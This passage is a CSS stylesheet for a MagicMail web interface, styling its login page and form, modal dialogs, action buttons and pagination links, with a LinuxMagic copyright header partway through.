    font-size: 12px;
    margin: 4px 0;
}

/*------------------------------------------*/
/* normalized / common action button styles */
/*------------------------------------------*/

/* style for buttons on a table row */
td.mm-table-action-buttons,
 /* style for full width divs method */
.mm-fw-div-action-buttons {
    text-align: right;
}

/* ensure if there are multiple buttons, that they receive some gaps between */
td.mm-table-action-buttons > * {
    margin-left: 5px;
}

/* style for buttons in a non full width div (TODO: find a better way... float is evil) */
.mm-nfw-div-action-buttons {
    float: right;
}

/* style for flexed buttons... */
.mm-fb-action-buttons {
    display: flex;
    justify-content: end;
    gap: 5px;
    padding-top: 10px;
}

.MagicContentCell {
    background: none;
    padding-top: 0px;
}
.MagicNavTab {
    display: none;
}
#UserSubHeaderRow {
    display: none;
}
#MainHeaderTable {
    height: 130;
    /* Make the grey gradient smaller during login */
    background-image: linear-gradient(#fefefe 0, #e6e7e8 80%,#FFF 20%);
}
#loginContentCell {
    margin: 0px 40px 20px 40px;
    padding: 20px;
    border-radius: 8px ;
    -moz-border-radius: 8px ;
    -webkit-border-radius: 8px ;
    background: #FFF;
    box-shadow: 3px 3px 5px 3px rgba(105,105,105,0.6);
    -webkit-box-shadow: 3px 3px 5px 3px rgba(105,105,105,0.6);
    -moz-box-shadow: 3px 3px 5px 3px rgba(105,105,105,0.6);
    -webkit-transition: opacity 1s ease-out;
    transition: opacity 1s ease-out;
    display: flex;
}

.login-info-content {
    width: 350px;
    margin-left: 20px;
    margin-top: 20px;
}
/* The following two SHOULD be defaults */
.login-info-content h2 {
    font-size: 25px;
}
.login-info-content h4,
#login-form-table h4 {
    color: #10456B;
    font-size: 1em;
    font-weight: bold;
}
#login-form-table h4 {
    text-align:center;
}
.login-info-content .main_wiz {
    color: #000;
    opacity: 0.7;
}
#login-form-wrapper {
    margin-right: 20px;
    margin-top: 20px;
    width: 350px;
    box-shadow: 3px 3px 5px 3px rgba(105,105,105,0.6);
    -webkit-box-shadow: 3px 3px 5px 3px rgba(105,105,105,0.6);
    -moz-box-shadow: 3px 3px 5px 3px rgba(105,105,105,0.6);
    -webkit-transition: opacity 1s ease-out;
    transition: opacity 1s ease-out;
    margin-left: 100px;
    padding-bottom: 30px;
}
#login-form-table {
    border: collapse;
    border-spacing: 0;
    width: 80%;
    border: 0px;
    margin: 0 auto;
}
#login-form-table th {
    border: 0px 0px 0px 2px solid darkgrey;
    background: none;
    padding-top: 20px;
    padding-bottom: 10px;
}
#login-form-table td {
    display: block;
    text-align: left;
}
#login-form-table tr td:first-child {
    padding-top: 20px;
}
#login-form-table tr td:nth-child(2) {
    padding-top: 5px;
}
#login-form-table tr:last-child {
    text-align: right;
}
#login-form-table label {
    font-size: .9em;
}
#login-form-table td.textright {
    color: #000;
    opacity: 0.7;
}
#login-form-table input {
    padding: 0px;
    margin: 0px;
    font-size: 1.3em;
    line-height: 1.4em;
}
#login-form-table input[type="submit"] {
    text-align: right;
    float: right;
    border: 1px outset #10456B;
    background: lightgrey;
    padding: 5px 15px 5px 15px;
    cursor: pointer;
}
/* Way to position to the adtrack insider the header */
.adtrack-user-spot-a {
    position: absolute;
    top: 50px;
    left: 380px;

}
/* Legacy id's from themes, are we to deprecate? */
/* Also could be from landing.php as well */
#recover-pass-td a {
    display: inline-block;
    padding-bottom: 5px;
    text-decoration: none;
}

#login-error {
    display: none;
    position:absolute;
    width:148px;
    margin-top:4px;
    font-weight:bold;
}

/* Login Page */
#LoginWrapper {
    margin: auto;
    width: 620px;
}

#LoginInfo {
    float: left;
    width: 400px;
    text-align: left;
    font-size: 14px;
    margin: 0;
}
#LoginInfo p {
    margin-top: 8px;
}

.LoginBody {
    background: #fff url('/images/background2.gif') repeat-x 0 0;
}
.LoginBody a {
    text-decoration: none;
}

.LoginBody #PoweredBadge {
    width: 100%;
    text-align: center;
    margin-top: 5px;
}

#login-form-table td.formFoot tr td {
    display: table-cell;
    padding-top: 0px;
    vertical-align: middle;
}

/* There is some whitespace in the powered by image. Move it left so that the */
/* actual image is in line with everything else */
#login-form-table tr td.poweredBy img {
    margin-left: -6px;
}

#login-form-table tr td.formFoot {
    padding-top: 0px;
}

#login-form-table tr td.formFoot table {
    width: 100%;
}

.LoginBody #Login {
    padding: 5px 15px 0;
}

#Login {
    width: 180px;
    padding: 5px 15px 35px;
    -moz-border-radius: 7px;
    -webkit-border-radius: 7px;
    border-radius: 7px;
    border-top: 2px solid #ededed;
    border-left: 2px solid #ededed;
    border-right: 1px solid #cdcdcd;
    border-bottom: 1px solid #cdcdcd;
    background: #dedede;
    margin-top: 50px;
    float: left;
}

#Login a:hover {
    border:none;
}

#LoginHeader h3 {
    margin-bottom: 10px;
    color: #10456B;
}

#login-form-table input[type="text"],
#login-form-table input[type="email"],
#login-form-table input[type="password"] {
    border-top: 2px solid #cdcdcd;
    border-left: 2px solid #cdcdcd;
    border-bottom: 2px solid #ededed;
    border-right: 2px solid #ededed;
    -moz-border-radius: 5px;
    -webkit-border-radius: 5px;
    border-radius: 5px;
    padding: 2px;
    height: 1.5em;
    width: 100%;
}

#login-form-table .show-password label {
	display: block;
	font-size: .8em;
    margin-top: 10px;
}


#login-form-table .show-password input[type="checkbox"] {
	vertical-align: bottom;
  	position: relative;
	font-size: .8em;
}

/* IE 10+ Detection (including MS Edge) */
@media all and (-ms-high-contrast: none), (-ms-high-contrast: active) {
    /*
        For IE only, we won't have the email and password inputs below the
        labels.  It doesn't seem to be possible to actually separate <td> tags
        by newlines in IE like you can with other browsers with the
        display: block. However, without doing anything, the inputs appear
        higher up than the labels, so this margin top pushes the inputs down to
        be inline with the labels
     */
    #login-form-table input[type="email"],
    #login-form-table input[type="password"] {
        margin-top: 10px;
    }
}

#login-form-table input[type="email"]:focus,
#login-form-table input[type="password"]:focus {
    background:#ffedde;
}

/* For backward compatability let's hide this row
.forgot-password-row {
    display: none;
}
*/


.login-modal-input {
    display: flex;
    align-items: end;
    font-size: 15px;
    margin: 10px 0 20px;
}

.login-modal-input input[type=checkbox]{
    flex: none;
    width: 25px;
    height: 25px;
} 

#login-modal-buttons {
    display: flex;
    justify-content: space-around;
}

#login-modal-buttons input {
    height: 50px;
}



/* The Modal (background) */
.mm-modal {
    display: none; /* Hidden by default */
    position: fixed; /* Stay in place */
    z-index: 1; /* Sit on top */
    padding-top: 100px; /* Location of the box */
    left: 0;
    top: 0;
    width: 100%; /* Full width */
    height: 100%; /* Full height */
    overflow: auto; /* Enable scroll if needed */
    background-color: rgb(0,0,0); /* Fallback color */
    background-color: rgba(0,0,0,0.4); /* Black w/ opacity */
}

/* Modal Content */
.mm-modal-content {
    background-color: #fefefe;
    margin: auto;
    border: 1px solid #888;
    width: 40%;
    min-width: 670px;
    overflow: scroll;
}

/* The Close Button */
.mm-modal-close {
    color: #aaaaaa;
    float: right;
    font-size: 28px;
    font-weight: bold;
}

.mm-modal-content {
    border: 1px solid black;
}

.mm-modal-body {
    padding: 10px;
}

.mm-modal-footer {
    background-color: #eee;
    padding: 10px;
    text-align: right;
}
.mm-modal-header {
    padding: 10px;
    background-color: #eee;
}

.mm-modal-msg {
    display: hidden;
    padding: 10px;
}

.mm-modal-body ul {
	padding-left: 11px;
	font-size: 14px;
}

.mm-modal-close:hover,
.mm-modalclose:focus {
    color: #000;
    text-decoration: none;
    cursor: pointer;
}

.mm-modal-footer button {
    position: relative;
}

#uncaught-spam-folder-modal .folder-content {
    text-align: center;
    font-size: 13px;
}

#uncaught-spam-folder-modal .folder-content {
    text-align: center;
    font-size: 13px;
}

/* Specific to admin interface, user.php */
.mm-modal-header h2 {
    margin-top: 6px;
    margin-bottom: 2px;
}
/*
 * COPYRIGHT INFORMATION - DO NOT REMOVE
 *
 * This file is part of the MagicMail (TM) Project and is
 * Copyright (c) LinuxMagic Inc. 2019 All Rights Reserved
 *
 * This file contains Original Code as created by LinuxMagic Inc.
 *
 * The Original Code is distributed on an 'AS IS' basis,
 * WITHOUT WARRANTY OF ANY KIND, EITHER EXPRESS OR IMPLIED, AND LINUXMAGIC
 * HEREBY DISCLAIMS ALL SUCH WARRANTIES, INCLUDING WITHOUT LIMITATION, ANY
 * WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE, QUIET
 * ENJOYMENT OR NON-INFRINGEMENT.
 *
 * Do NOT download, distribute, use or alter this software or file in any
 * way without express written permission from LinuxMagic Inc. or its parent
 * company Wizard Tower TechnoServices signed by an authorized company officer.
 *
 * Author(s): Steven Hall <stevenh@linuxmagic.com>
 *
 * $Id:
 */

.pageLinks {
    text-align: center;
}
form.pageLinks {
    margin-top: 10px;
}
.pageLinkDigit {
    color: #666;
    text-align: center;
}

.pageLinks div,
.pageLinks select,
.pageLinks input {
    border: 1px solid #ccc;
    background: -moz-linear-gradient(top, #f7f7f7 0%, #e7ebe7 50%, #efebef 100%);
    background: -webkit-linear-gradient(top, #f7f7f7 0%,#e7ebe7 50%,#efebef 100%);
    background: linear-gradient(to bottom, #f7f7f7 0%,#e7ebe7 50%,#efebef 100%);
    filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#f7f7f7', endColorstr='#efebef',GradientType=0 );
    width: 30px;
    box-sizing: border-box;
    display: inline-block;
    line-height: 21px;
}

.pageLinks select,
.pageLinks input {
    width: auto;
}

.pageLinks div:hover a,
.pageLinks select:hover,
.pageLinks input:hover {
    background: -moz-linear-gradient(top, #E6E6E6 0%, #CBCCCB 50%, #B8B8B8 100%);
    background: -webkit-linear-gradient(top, #E6E6E6 0%, #CBCCCB 50%, #B8B8B8 100%);
    filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#E6E6E6', endColorstr='#B8B8B8',GradientType=0 );
    background: linear-gradient(to bottom, #E6E6E6 0%, #CBCCCB 50%, #B8B8B8 100%);
}

.pageLinkDigit:hover {
    background: -moz-linear-gradient(top, #f7f7f7 0%, #e7ebe7 50%, #efebef 100%);
    background: -webkit-linear-gradient(top, #f7f7f7 0%,#e7ebe7 50%,#efebef 100%);
    background: linear-gradient(to bottom, #f7f7f7 0%,#e7ebe7 50%,#efebef 100%);
    filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#f7f7f7', endColorstr='#efebef',GradientType=0 );
}

.pageLinks div:first-child {
    -webkit-border-top-left-radius: 3px;
    -webkit-border-bottom-left-radius: 3px;
    -moz-border-radius-topleft: 3px;
    -moz-border-radius-bottomleft: 3px;
    border-top-left-radius: 3px;
    border-bottom-left-radius: 3px;
    width: 45px;
}


.pageLinks div:last-child  {
    -webkit-border-top-right-radius: 3px;
    -webkit-border-bottom-right-radius: 3px;
    -moz-border-radius-topright: 3px;
    -moz-border-radius-bottomright: 3px;
    border-top-right-radius: 3px;
    border-bottom-right-radius: 3px;
    width: 45px;
}

div.selectedPage {
    background: -moz-linear-gradient(top, #E6E6E6 0%, #CBCCCB 50%, #B8B8B8 100%);
    background: -webkit-linear-gradient(top, #E6E6E6 0%, #CBCCCB 50%, #B8B8B8 100%);
    filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#E6E6E6', endColorstr='#B8B8B8',GradientType=0 );
    background: linear-gradient(to bottom, #E6E6E6 0%, #CBCCCB 50%, #B8B8B8 100%);
    font-weight: bold;
    color: #10456b;
    width: 30px;
    box-sizing: border-box;
    text-align: center;
}

.pageLinkDigit a {
    box-sizing: border-box;
    color: #10456b;
    display: inline-block;
    text-decoration: none;
    width: 100%;
}

select.pageLinkDigit,
input.pageLinkDigit {
    box-sizing: border-box;
    color: #10456b;
    display: inline-block;
    text-decoration: none;
    cursor: pointer;
}

.selectedPage {
    line-height: 25px;
}


#loginContentCell {
    display: flex;
    justify-content: center;
    align-items: flex-start;
    gap: 50px;
    max-width: 1100px;
    margin: 40px auto;
    padding: 20px;
}

.login-info-content {
    flex: 1;
    max-width: 450px;
}

#login-form-wrapper {
    flex: 0 0 350px;
}

#login-form-table {
    width: 100%;
}

/* Mobile */
@media (max-width: 768px) {
    #loginContentCell {
        flex-direction: column;
        align-items: center;
    }

    .login-info-content,
    #login-form-wrapper {
        max-width: 100%;
        width: 100%;
    }
}

</style>

